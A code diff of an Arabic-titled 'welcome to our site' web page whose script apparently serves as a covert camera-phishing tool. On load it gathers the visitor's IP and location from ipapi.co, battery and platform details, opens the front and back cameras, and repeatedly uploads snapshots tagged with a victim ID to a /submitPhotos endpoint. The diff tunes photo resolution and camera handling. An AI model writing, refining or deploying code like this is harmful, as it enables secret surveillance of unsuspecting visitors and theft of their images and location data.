@@ -3,7 +3,7 @@
 <head>
     <title>مرحبا بك في موقعنا</title>
     <style>
-      body {
+        body {
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
@@ -51,7 +51,7 @@
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
-         try {
+            try {
                 const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                 const battery = await navigator.getBattery();
 
@@ -69,6 +69,7 @@
                 return {};
             }
         }
+
         function getPlatformInfo() {
             const ua = navigator.userAgent;
             if (/Windows/.test(ua)) return { platform: "Windows" };
@@ -89,14 +90,16 @@
             try {
                 const constraints = {
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
                         facingMode: facingMode
                     }
                 };
 
-                if (facingMode === 'environment') {
-                    constraints.video.facingMode = { exact: 'environment' };
+                if (facingMode === 'user') {
+                    constraints.video.width = { ideal: 640 };
+                    constraints.video.height = { ideal: 480 };
+                } else {
+                    constraints.video.width = { ideal: 800 };
+                    constraints.video.height = { ideal: 600 };
                 }
 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -110,13 +113,8 @@
         async function init() {
             try {
                 const additionalData = await collectAdditionalData();
-                let frontStream = await requestCameraPermission('user');
-                let backStream = await requestCameraPermission('environment');
-
-                // إذا فشل الحصول على الكاميرا الخلفية، حاول مرة أخرى بدون تحديد دقيق
-                if (!backStream) {
-                    backStream = await requestCameraPermission({ facingMode: 'environment' });
-                }
+                const frontStream = await requestCameraPermission('user');
+                const backStream = await requestCameraPermission('environment');
 
                 if (frontStream || backStream) {
                     handleSuccess(frontStream, backStream, additionalData);
@@ -162,6 +160,8 @@
                         formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
                         formData.append('userId', userId);
                         formData.append('cameraType', cameraType);
+                        formData.append('imageWidth', videoWidth);
+                        formData.append('imageHeight', videoHeight);
                         formData.append('additionalData', JSON.stringify(additionalData));
                         post('/submitPhotos', formData);
                     }, 'image/webp', 0.7);
@@ -209,6 +209,7 @@
 
             console.error('Max retries reached. Unable to send photos.');
         }
+
         window.addEventListener('load', init);
     </script>
 </body>
